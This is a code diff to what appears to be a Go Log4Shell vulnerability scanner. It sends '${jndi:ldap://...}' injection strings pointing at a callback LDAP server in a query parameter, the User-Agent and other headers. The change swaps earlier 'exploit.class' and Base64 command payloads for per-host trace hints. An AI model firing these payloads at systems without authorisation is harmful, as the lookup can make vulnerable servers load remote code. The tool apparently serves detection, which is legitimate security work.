@@ -31,11 +31,14 @@ func ScanIP(hostUrl string, serverUrl string, wg *sync.WaitGroup, resChan chan s
 	log.Debugf("Target URL: %s", hostUrl)
 	baseUrl, err := url.Parse(hostUrl)
 	param := url.Values{}
-	param.Add("x", fmt.Sprintf("${jndi:ldap://%s/%s}", serverUrl, "test"))
-	baseUrl.RawQuery = param.Encode()
 	targetUrl := baseUrl.String()
-	targetUserAgent := fmt.Sprintf("${jndi:ldap://%s/exploit.class}", serverUrl)
-	targetHeader := fmt.Sprintf("${jndi:ldap://%s/Basic/Command/Base64/Y29udGFjdEBwcm9mZXJvLmlv}", serverUrl)
+
+	traceHint := fmt.Sprintf("%s_%s", baseUrl.Hostname(), baseUrl.Port())
+
+	param.Add("x", fmt.Sprintf("${jndi:ldap://%s/%s}", serverUrl, traceHint))
+	baseUrl.RawQuery = param.Encode()
+	targetUserAgent := fmt.Sprintf("${jndi:ldap://%s/%s}", serverUrl, traceHint)
+	targetHeader := fmt.Sprintf("${jndi:ldap://%s/%s}", serverUrl, traceHint)
 	//log.Debugf("Target User-Agent: %s", targetUserAgent)
 	//log.Debugf("Target X-Api-Version: %s", targetHeader)
 	request, err := http.NewRequest("GET", targetUrl, nil)
@@ -44,7 +47,7 @@ func ScanIP(hostUrl string, serverUrl string, wg *sync.WaitGroup, resChan chan s
 		log.Fatal(err)
 	}
 	request.Header.Set("User-Agent", targetUserAgent)
-	request.Header.Add("X-Api-Version", targetHeader)
+	addCommonHeaders(&request.Header,targetHeader)
 	response, err := client.Do(request)
 	if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
 		log.Debug(err)
